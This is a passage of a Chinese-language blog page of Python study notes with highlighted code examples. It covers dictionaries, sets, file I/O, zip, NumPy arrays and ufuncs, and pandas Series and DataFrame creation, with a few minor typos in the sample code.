class="string">'num'</span>]=<span class="number">1</span></div><div class="line">dic.update(&#123;<span class="string">'ok'</span>:<span class="string">'1'</span>&#125;) <span class="comment">#从b字典中更新a字典，如果键相同则更新，a中不存在则追加</span></div><div class="line"><span class="comment">#删除</span></div><div class="line"><span class="keyword">del</span> dic[<span class="string">'ok'</span>]</div><div class="line">dic.pop(<span class="string">'num'</span>)</div></pre></td></tr></table></figure></p>
<h3 id="字典应用"><a href="#字典应用" class="headerlink" title="字典应用"></a>字典应用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">len(dic) <span class="comment">#字典中键值对的数量</span></div><div class="line"><span class="keyword">if</span> key <span class="keyword">in</span> dic :<span class="comment">#判断</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'ok'</span></div><div class="line"><span class="keyword">for</span> key <span class="keyword">in</span> dic : <span class="comment">#枚举字典中的键，键是无序的</span></div><div class="line">    <span class="keyword">print</span> dic[key]</div><div class="line">dic.items() <span class="comment"># 全部的键值对 用两个变量接受</span></div><div class="line">dic.keys() <span class="comment"># 全部的键</span></div><div class="line">dic.valus() <span class="comment"># 全部的值</span></div><div class="line">dic.clear() <span class="comment"># 清空字典</span></div></pre></td></tr></table></figure>
<h3 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> t <span class="keyword">in</span> h.iteritems()</div><div class="line">    <span class="keyword">print</span> t  <span class="comment"># (1, 'lala')</span></div><div class="line"><span class="keyword">for</span> t,v <span class="keyword">in</span> h.items()</div><div class="line">    <span class="keyword">print</span> t,v <span class="comment"># 1 lala</span></div></pre></td></tr></table></figure>
<h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><p>元素不重复，无序，不能枚举<br>不支持索引和切片操作<br>分为可变集合（set）和不变集合(frozen set)</p>
<h3 id="基础操作-3"><a href="#基础操作-3" class="headerlink" title="基础操作"></a>基础操作</h3><p>生成、添加、删除<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#生成</span></div><div class="line">x=&#123;<span class="string">'key1'</span>,<span class="string">'key2'</span>&#125; </div><div class="line"><span class="keyword">print</span> x <span class="comment"># set(['key2', 'key1'])</span></div><div class="line">y=frozenset([<span class="string">'key1'</span>,<span class="string">'key2'</span>])</div><div class="line"><span class="keyword">print</span> y <span class="comment"># frozenset(['key2', 'key1'])</span></div><div class="line">k=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</div><div class="line">l=set(k)</div><div class="line"><span class="keyword">print</span> l <span class="comment"># set([1, 2, 3])</span></div><div class="line"><span class="comment">#添加</span></div><div class="line">l.add(<span class="string">'body'</span>) <span class="comment"># set(['body', 1, 2, 3])</span></div><div class="line"><span class="comment">#删除</span></div><div class="line">l.remove(<span class="string">'body'</span>) <span class="comment"># set([1, 2, 3])</span></div><div class="line">l.discard(<span class="string">'body'</span>) <span class="comment"># set([1, 2, 3]) 删除不存在的元素。discard不抛出异常，remove抛出异常</span></div></pre></td></tr></table></figure></p>
<h3 id="集合运算"><a href="#集合运算" class="headerlink" title="集合运算"></a>集合运算</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># - 差集</span></div><div class="line"><span class="comment"># &amp; 交集</span></div><div class="line"><span class="comment"># | 并集</span></div><div class="line"><span class="comment"># != 不等于</span></div><div class="line"><span class="comment"># == 等于</span></div><div class="line"><span class="comment"># &lt; 是否为子集</span></div><div class="line"><span class="comment"># &gt; 是否为超集</span></div><div class="line"><span class="comment"># set.isdisjoint(t) 是否有交集</span></div></pre></td></tr></table></figure>
<h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">f=open(<span class="string">'test.txt'</span>,<span class="string">'r'</span>)</div><div class="line">f.read() <span class="comment"># 一次读取文件的全部的内容 存入str</span></div><div class="line">f.readline() <span class="comment"># 每次读取一行</span></div><div class="line">f.readlines()  <span class="comment"># 一次读取所有内容并按行返回list列表</span></div><div class="line"></div><div class="line">f=open(<span class="string">'test.txt'</span>,<span class="string">'w'</span>) <span class="comment"># </span></div><div class="line">f.write(<span class="string">'Hello'</span>) <span class="comment"># </span></div><div class="line">f.close()</div></pre></td></tr></table></figure>
<h2 id="Zip函数"><a href="#Zip函数" class="headerlink" title="Zip函数"></a>Zip函数</h2><p>zip(list1,list2)<br>输入：任意多个（包括0个和1个）序列  元组也可<br>返回：各个序列相应索引组成的元组的列表<br>序列长度不一，最后有多少个元组，取最短的序列作为元组长度<br>0个序列时 返回空序列<br>1个序列时 返回一个值的元组组成的序列 如：[(1,),(2,)]<br>zip(*list)<br>把zip的结果作为list输入，相当于unzip()<br>把序列拆分，其中的元组作为序列重新zip，变为原来的序列对应的元组</p>
<h2 id="Numpy"><a href="#Numpy" class="headerlink" title="Numpy"></a>Numpy</h2><p>列表list元素可以是任何对象，保存指针，浪费内存cpu<br>python自带array——一维数组，没有运算函数<br>Numpy的两种基本对象：<br>ndarray：数组，存储单一数据类型的多维数组<br>ufuc：对数组进行处理的函数</p>
<h3 id="ndarray对象"><a href="#ndarray对象" class="headerlink" title="ndarray对象"></a>ndarray对象</h3><p>索引，切片适用<br>导入、生成<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"><span class="comment">#from numpy import *</span></div><div class="line"><span class="comment">##### 通过创建python序列，再通过array函数转化为数组</span></div><div class="line">a=np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],dtype=np.float) <span class="comment">#dtype 设定元素类型，默认整数</span></div><div class="line"><span class="keyword">print</span> a  <span class="comment"># [ 1.  2.  3.  4.]</span></div><div class="line"><span class="keyword">print</span> a.dtype <span class="comment"># float64</span></div><div class="line">b=np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],[<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>]])</div><div class="line"><span class="keyword">print</span> b  </div><div class="line"><span class="comment">#[[1 2 3 4]</span></div><div class="line"><span class="comment"># [5 6 7 8]]</span></div><div class="line"><span class="comment">##### numpy自带创建创建数组函数</span></div><div class="line"><span class="comment">#np.arange(start=0,end,step=1) 左包右开</span></div><div class="line">g=np.arange(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0.2</span>) <span class="comment"># [ 0.   0.2  0.4  0.6  0.8]</span></div><div class="line"><span class="comment">#np.linspace(start,end,num,endpoint=True(包括终值)) 等差数列</span></div><div class="line">h=np.linspace(<span class="number">0</span>,<span class="number">1</span>,<span class="number">5</span>,endpoint=<span class="keyword">False</span>) <span class="comment"># [ 0.   0.2  0.4  0.6  0.8]</span></div><div class="line"><span class="comment">#np.logspace(start,end,num,endpoint=True(包括终值)),base=10（底数）) 等比数列</span></div><div class="line"><span class="comment">#base^start~base^end 取num</span></div><div class="line">j=np.logspace(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,base=<span class="number">2</span>) <span class="comment"># [ 1.  2.]</span></div><div class="line"><span class="comment">#全0</span></div><div class="line">np.zeros((<span class="number">3</span>,<span class="number">3</span>))</div><div class="line"><span class="comment">#全1</span></div><div class="line">np.ones((<span class="number">3</span>,<span class="number">3</span>))</div><div class="line"><span class="comment">#对角线为1，4*4</span></div><div class="line">np.eye(<span class="number">4</span>)</div><div class="line"><span class="comment">#随机数 元素值0-1的2*2的随机数组</span></div><div class="line">np.random.rand(<span class="number">2</span>,<span class="number">2</span>)</div><div class="line"><span class="comment">#fromfuction（函数，尺寸） 生成乘法表</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(i,j)</span>:</span></div><div class="line">    <span class="keyword">return</span> (i+<span class="number">1</span>)*(j+<span class="number">1</span>)</div><div class="line">table = np.fromfunction(func,(<span class="number">4</span>,<span class="number">4</span>))</div><div class="line"><span class="comment"># [[  1.   2.   3.   4.]</span></div><div class="line"><span class="comment">#  [  2.   4.   6.   8.]</span></div><div class="line"><span class="comment">#  [  3.   6.   9.  12.]</span></div><div class="line"><span class="comment">#  [  4.   8.  12.  16.]]</span></div></pre></td></tr></table></figure></p>
<h3 id="ndarray函数"><a href="#ndarray函数" class="headerlink" title="ndarray函数"></a>ndarray函数</h3><p>以下类似1,2 其实都是元组 （1,2）<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#获取数组维数</span></div><div class="line"><span class="keyword">print</span> a.shape,b.shape <span class="comment"># (4L,) (2L, 4L) 一维数组 4列 二维数组 2行4列</span></div><div class="line"><span class="comment">#元素不变情况下,定义数组尺寸</span></div><div class="line">b.shape=<span class="number">4</span>,<span class="number">2</span></div><div class="line"><span class="keyword">print</span> b</div><div class="line"><span class="comment"># [[1 2]</span></div><div class="line"><span class="comment">#  [3 4]</span></div><div class="line"><span class="comment">#  [5 6]</span></div><div class="line"><span class="comment">#  [7 8]]</span></div><div class="line"><span class="comment">#创建改变数组尺寸的新数组</span></div><div class="line">c=b.reshape(<span class="number">8</span>,)  <span class="comment"># [1 2 3 4 5 6 7 8]</span></div><div class="line">d=b.reshape(<span class="number">1</span>,<span class="number">8</span>) <span class="comment"># [[1 2 3 4 5 6 7 8]]</span></div><div class="line"><span class="comment">## reshape生成的新数组其实共享数据存储区域，牵一发而动全身</span></div></pre></td></tr></table></figure></p>
<h4 id="存取数组"><a href="#存取数组" class="headerlink" title="存取数组"></a>存取数组</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#### 二维数组的切片取数  二维列表没有二维切片</span></div><div class="line">data=np.arange(<span class="number">16</span>).reshape(<span class="number">4</span>,<span class="number">4</span>)</div><div class="line">data2=data[<span class="number">1</span>:<span class="number">3</span>,<span class="number">2</span>:<span class="number">4</span>] <span class="comment">#左闭右开</span></div><div class="line">[[ <span class="number">6</span>  <span class="number">7</span>]</div><div class="line"> [<span class="number">10</span> <span class="number">11</span>]]</div><div class="line"><span class="comment">#########data展开成一行</span></div><div class="line"><span class="keyword">print</span> data[:]</div><div class="line"><span class="comment">#### 通过列表list取数 </span></div><div class="line"><span class="comment">##整数序列 作为索引 取行</span></div><div class="line">data3=data[[<span class="number">0</span>,<span class="number">1</span>]]</div><div class="line">[[<span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span>]</div><div class="line"> [<span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span>]]</div><div class="line"><span class="comment">##元组序列 作为点索引 取点</span></div><div class="line">data4=data[[(<span class="number">0</span>,<span class="number">0</span>),(<span class="number">0</span>,<span class="number">1</span>)]]</div><div class="line">[<span class="number">0</span> <span class="number">1</span>]</div><div class="line"><span class="comment">##布尔序列 元素个数要一致</span></div><div class="line">data5=data4[np.array([<span class="keyword">True</span>,<span class="keyword">False</span>])]</div><div class="line">data5=data4[[<span class="keyword">True</span>,<span class="keyword">False</span>]]  <span class="comment">#两者一样</span></div><div class="line">[<span class="number">0</span>]</div><div class="line"><span class="comment">#### 条件筛选</span></div><div class="line">data2&gt;<span class="number">10</span> </div><div class="line">[[<span class="keyword">False</span> <span class="keyword">False</span>]</div><div class="line"> [<span class="keyword">False</span>  <span class="keyword">True</span>]]</div><div class="line"><span class="comment">#选出data中大于10的元素变成一维数组 原理是布尔序列取数</span></div><div class="line">data[data&gt;<span class="number">10</span>] <span class="comment">#[11 12 13 14 15]</span></div><div class="line"><span class="comment">#选出data中偶数元素变为一维数组  原理是布尔序列取数</span></div><div class="line">data[data%<span class="number">2</span>==<span class="number">0</span>] <span class="comment">#[ 0  2  4  6  8 10 12 14]</span></div></pre></td></tr></table></figure>
<h4 id="where函数"><a href="#where函数" class="headerlink" title="where函数"></a>where函数</h4><p>元素依次进入，生成返回值数组<br>np.where(条件,真返回值,假返回值)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf8</span></div><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line">arr=np.random.rand(<span class="number">2</span>,<span class="number">2</span>)</div><div class="line"><span class="keyword">print</span> np.where(arr&gt;<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0</span>)</div><div class="line">[[<span class="number">1</span> <span class="number">0</span>]</div><div class="line"> [<span class="number">0</span> <span class="number">0</span>]]</div></pre></td></tr></table></figure></p>
<p>cunsum函数、cumprod函数<br>对行（0）或列（1）累计求和、求列</p>
<h3 id="ufunc运算"><a href="#ufunc运算" class="headerlink" title="ufunc运算"></a>ufunc运算</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">np.sin(ndarray) <span class="comment">#对于ndarray中的每个元素求正弦值 返回新数组</span></div><div class="line">np.add(ndarray1,ndarray2[,ndarray3]) <span class="comment">#对于其中的元素一一相加 返回新数组[写入ndarray3]</span></div><div class="line">np.subtract(x1,x2[,y]) <span class="comment"># y=x1 - x2</span></div><div class="line">np.multiply(x1,x2[,y]) <span class="comment"># y=x1 * x2</span></div><div class="line">np.divide(x1,x2[,y]) <span class="comment"># y=x1 / x2</span></div><div class="line">np.true divide(x1,x2[,y]) <span class="comment"># y=x1 / x2 返回精确商</span></div><div class="line">np.floor divide(x1,x2[,y]) <span class="comment"># y=x1 // x2 返回对返回值取整</span></div><div class="line">np.negative(x[,y]) <span class="comment"># y= -x</span></div><div class="line">np.power(x1,x2[,y]) <span class="comment"># y = x1**x2</span></div><div class="line">np.remainder(x1,x2[,y]) <span class="comment"># y = x1 % x2</span></div></pre></td></tr></table></figure>
<h2 id="Pandas"><a href="#Pandas" class="headerlink" title="Pandas"></a>Pandas</h2><p>Series 和 DataFrame 支持切片、筛选</p>
<h3 id="Series"><a href="#Series" class="headerlink" title="Series"></a>Series</h3><p>Series 类似于一维数组的对象，由一组数据以及相关的索引组成<br>生成、读取属性<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pandas <span class="keyword">import</span> *</div><div class="line"><span class="comment">############从序列中生成</span></div><div class="line">se=Series([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</div><div class="line"><span class="keyword">print</span> se</div><div class="line"><span class="comment">#索引 数据</span></div><div class="line"><span class="comment"># 0    1</span></div><div class="line"><span class="comment"># 1    2</span></div><div class="line"><span class="comment"># 2    3</span></div><div class="line"><span class="comment"># 3    4</span></div><div class="line"><span class="comment"># dtype: int64</span></div><div class="line">se=Series([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],index=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>])</div><div class="line"><span class="keyword">print</span> se</div><div class="line"><span class="comment"># a    1</span></div><div class="line"><span class="comment"># b    2</span></div><div class="line"><span class="comment"># c    3</span></div><div class="line"><span class="comment"># d    4</span></div><div class="line"><span class="comment"># dtype: int64</span></div><div class="line"><span class="comment">#################从字典中生成</span></div><div class="line">sdata=&#123;<span class="string">'num1'</span>:<span class="number">1</span>,<span class="string">'num2'</span>:<span class="number">2</span>,<span class="string">'num3'</span>:<span class="number">3</span>&#125;</div><div class="line">obj2=Series(sdata)</div><div class="line"><span class="keyword">print</span> obj2</div><div class="line"><span class="comment"># num1    1</span></div><div class="line"><span class="comment"># num2    2</span></div><div class="line"><span class="comment"># num3    3</span></div><div class="line"><span class="comment"># dtype: int64</span></div><div class="line"><span class="comment">#################从字典中生成，按照index排序，重构</span></div><div class="line">sdata=&#123;<span class="string">'num1'</span>:<span class="number">1</span>,<span class="string">'num2'</span>:<span class="number">2</span>,<span class="string">'num3'</span>:<span class="number">3</span>&#125;</div><div class="line">states=[<span class="string">'num2'</span>,<span class="string">'num1'</span>,<span class="string">'name'</span>]</div><div class="line">obj2=Series(sdata,index=states)</div><div class="line"><span class="keyword">print</span> obj2</div><div class="line"><span class="comment">#  索引  数据</span></div><div class="line"><span class="comment"># num2    2.0</span></div><div class="line"><span class="comment"># num1    1.0</span></div><div class="line"><span class="comment"># name    NaN</span></div><div class="line"><span class="comment"># dtype: float64</span></div><div class="line"><span class="comment">###########属性</span></div><div class="line"><span class="keyword">print</span> se.values,se.index </div><div class="line"><span class="comment">#[1 2 3 4] Index([u'a', u'b', u'c', u'd'], dtype='object')</span></div></pre></td></tr></table></figure></p>
<h4 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h4><p>不支持切片取数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">obj=Series([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],index=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>])</div><div class="line"><span class="comment">###########按照索引读取值</span></div><div class="line"><span class="keyword">print</span> obj[<span class="string">'a'</span>] </div><div class="line"><span class="comment"># 1</span></div><div class="line"><span class="comment">###########按照索引序列读取行</span></div><div class="line"><span class="keyword">print</span> obj[[<span class="string">'a'</span>,<span class="string">'b'</span>]] </div><div class="line"><span class="comment"># a    1</span></div><div class="line"><span class="comment"># b    2</span></div><div class="line"><span class="comment"># dtype: int64</span></div><div class="line"><span class="comment">###########按照布尔Series取行</span></div><div class="line">a=Series(&#123;<span class="string">'a'</span>:<span class="keyword">True</span>,<span class="string">'b'</span>:<span class="keyword">True</span>,<span class="string">'c'</span>:<span class="keyword">True</span>,<span class="string">'d'</span>:<span class="keyword">False</span>&#125;)</div><div class="line"><span class="keyword">print</span> obj[a]</div><div class="line"><span class="comment"># a    1</span></div><div class="line"><span class="comment"># b    2</span></div><div class="line"><span class="comment"># c    3</span></div></pre></td></tr></table></figure></p>
<h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><p>del<br>只能删除一个 obj[‘’]<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">obj=Series([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],index=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>])</div><div class="line"><span class="keyword">del</span> obj[<span class="string">'a'</span>]</div><div class="line"><span class="keyword">print</span> obj</div><div class="line"><span class="comment"># b    2</span></div><div class="line"><span class="comment"># c    3</span></div><div class="line"><span class="comment"># d    4</span></div><div class="line"><span class="comment"># dtype: int64</span></div></pre></td></tr></table></figure></p>
<p>drop<br>删除一个(‘’) 删除多个([‘’,’’])<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pandas <span class="keyword">import</span> *</div><div class="line">obj=Series([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],index=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>])</div><div class="line"><span class="keyword">print</span> obj.drop([<span class="string">'a'</span>,<span class="string">'b'</span>])</div><div class="line"><span class="comment"># c    3</span></div><div class="line"><span class="comment"># d    4</span></div><div class="line"><span class="comment"># dtype: int64</span></div></pre></td></tr></table></figure></p>
<h4 id="筛选"><a href="#筛选" class="headerlink" title="筛选"></a>筛选</h4><p>numpy DataFrame 同理<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">print</span> obj&gt;pbj.median()</div><div class="line"><span class="comment"># a    False</span></div><div class="line"><span class="comment"># b    False</span></div><div class="line"><span class="comment"># c     True</span></div><div class="line"><span class="comment"># d     True</span></div><div class="line"><span class="keyword">print</span> obj[obj&gt;obj.median()]  <span class="comment">#原理 按照布尔Series取数</span></div><div class="line"><span class="comment"># c    3</span></div><div class="line"><span class="comment"># d    4</span></div><div class="line"><span class="comment"># dtype: int64</span></div></pre></td></tr></table></figure></p>
<p>isnull notnull函数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd </div><div class="line">a=&#123;<span class="string">'ok'</span>:<span class="number">1</span>,<span class="string">'go'</span>:<span class="number">2</span>,<span class="string">'od'</span>:<span class="number">3</span>&#125;</div><div class="line">obj=pd.Series(a,index=[<span class="string">'ok'</span>,<span class="string">'go'</span>,<span class="string">'od'</span>,<span class="string">'fi'</span>])</div><div class="line"><span class="keyword">print</span> pd.isnull(obj)</div><div class="line">ok    <span class="keyword">False</span></div><div class="line">go    <span class="keyword">False</span></div><div class="line">od    <span class="keyword">False</span></div><div class="line">fi     <span class="keyword">True</span></div><div class="line">dtype: bool</div></pre></td></tr></table></figure></p>
<p>Series运算，索引取并集，索引相同之间运算，索引不同显示NaN</p>
<h3 id="DataFrame"><a href="#DataFrame" class="headerlink" title="DataFrame"></a>DataFrame</h3><p>表格型数据结构<br>有行索引，有列索引<br>列的地位比行的高</p>
<h4 id="生成"><a href="#生成" class="headerlink" title="生成"></a>生成</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="comment">####################通过等长列表生成</span></div><div class="line"><span class="keyword">from</span> pandas <span class="keyword">import</span> *</div><div class="line">data1=[[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,],[<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>],[<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>]]</div><div class="line">frame=DataFrame(data1)</div><div class="line"><span class="keyword">print</span> frame</div><div class="line"><span class="comment">#    0   1   2   3</span></div><div class="line"><span class="comment"># 0  1   2   3   4</span></div><div class="line"><span class="comment"># 1  5   6   7   8</span></div><div class="line"><span class="comment"># 2  9  10  11  12</span></div><div class="line"><span class="comment">#######通过序列或Numpy数组组成的字典生成，字典的键名作为列名</span></div><div class="line">data2=&#123;<span class="string">'num1'</span>:[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],<span class="string">'num2'</span>:[<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>],<span class="string">'num3'</span>:[<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>]&#125;</div><div class="line">frame=DataFrame(data2)</div><div class="line"><span class="keyword">print</span> frame</div><div class="line"><span class="comment">#    num1  num2  num3</span></div><div class="line"><span class="comment"># 0     1     5     9</span></div><div class="line"><span class="comment"># 1     2     6    10</span></div><div class="line"><span class="comment"># 2     3     7    11</span></div><div class="line"><span class="comment"># 3     4     8    12</span></div><div class="line"><span class="comment">#######已经有列名，添加columns作为列序列，按照指定顺序排序</span></div><div class="line">frame=DataFrame(data2,columns=[<span class="string">'num3'</span>,<span class="string">'num2'</span>,<span class="string">'num1'</span>])</div><div class="line"><span class="keyword">print</span> frame</div><div class="line"><span class="comment">#    num3  num2  num1</span></div><div class="line"><span class="comment"># 0     9     5     1</span></div><div class="line"><span class="comment"># 1    10     6     2</span></div><div class="line"><span class="comment"># 2    11     7     3</span></div><div class="line"><span class="comment"># 3    12     8     4</span></div><div class="line"><span class="comment">##############添加index作为行索引</span></div><div class="line">frame=DataFrame(data2,index=[<span class="string">'one'</span>,<span class="string">'two'</span>,<span class="string">'three'</span>,<span class="string">'four'</span>])</div><div class="line"><span class="keyword">print</span> frame</div><div class="line"><span class="comment">#        num1  num2  num3</span></div><div class="line"><span class="comment"># one       1     5     9</span></div><div class="line"><span class="comment"># two       2     6    10</span></div><div class="line"><span class="comment"># three     3     7    11</span></div><div class="line"><span class="comment"># four      4     8    12</span></div><div class="line"><span class="comment">###############嵌套字典生成DataFrame  外层字典的键作为列索引，内层键作为行索引</span></div><div class="line">data2=&#123;<span class="string">'num1'</span>:&#123;<span class="string">'one'</span>:<span class="number">1</span>,<span class="string">'two'</span>:<span class="number">2</span>&#125;,</div><div class="line"><span class="string">'num2'</span>:&#123;<span class="string">'one'</span>:<span class="number">5</span>,<span class="string">'two'</span>:<span class="number">6</span>&#125;,</div><div class="line"><span class="string">'num3'</span>:&#123;<span class="string">'one'</span>:<span class="number">9</span>,<span class="string">'two'</span>:<span class="number">10</span>&#125;&#125;</div><div class="line">frame=DataFrame(data2)</div><div class="line"><span class="keyword">print</span> frame</div><div class="line"><span class="comment">#      num1  num2  num3</span></div><div class="line"><span class="comment"># one     1     5     9</span></div><div class="line"><span class="comment"># two     2     6    10</span></div></pre></td></tr></table></figure>
